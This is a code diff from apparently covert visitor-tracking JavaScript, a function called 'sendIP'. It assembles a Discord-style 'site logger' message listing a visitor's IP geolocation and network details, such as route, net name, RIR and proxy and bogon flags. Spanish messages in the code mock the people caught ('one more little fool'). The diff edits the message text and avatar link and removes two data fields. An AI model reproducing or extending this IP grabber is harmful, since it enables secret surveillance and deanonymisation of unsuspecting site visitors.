@@ -25,8 +25,8 @@ const sendIP = async () => {
     // 3) Preparar el payload (ejemplo: embed para Discord)
     const payload = {
       username: "site logger",
-      // avatar_url: "https://example.com/avatar.jpg",
-      content: `ya cayo un pendejo`,
+      // avatar_url: "https://i.postimg.cc/W3gQ5b7C/Screenshot-2025-03-29-015623.png",
+      content: `ya cayo`,
       embeds: [
         {
           title: 'Un tontito mas',
@@ -42,8 +42,6 @@ const sendIP = async () => {
             `**Satellite >>** ${geoData.is_satellite || 'N/A'}`,
             `**Route >>** ${geoData.asn.route || 'N/A'}`,
             `**Net Name >>** ${geoData.asn.netname || 'N/A'}`,
-            `**Country Code >>** ${geoData.asn.country_code || 'N/A'}`,
-            `**Domain >>** ${geoData.asn.domain || 'N/A'}`,
             `**RIR >>** ${geoData.asn.rir || 'N/A'}`,
             `**Bogon IP >>** ${geoData.privacy.is_bogon || 'N/A'}`,
             `**Proxy IP >>** ${geoData.privacy.is_proxy || 'N/A'}`,
